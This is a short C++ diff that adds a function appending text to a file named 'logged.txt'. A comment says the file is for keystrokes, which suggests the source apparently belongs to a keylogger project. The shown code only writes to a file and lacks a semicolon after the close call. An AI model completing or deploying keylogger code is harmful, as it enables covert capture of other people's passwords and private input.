@@ -2,9 +2,16 @@
 #include <iostream>
 #include <fstream>
 
+#define FILE_NAME "logged.txt"
 
-void fileData() {
+void fileData(std::string data) {
+    std::fstream log_file;
+    //Create the file. If the file exists, append to it instead of erasing.
+    log_file.open(FILE_NAME, std::ios::app);
     //put keystrokes into text file
+    log_file << data;
+    //Close the file
+    log_file.close()
 }
 
 std::string specialKey(int keyPressed) {
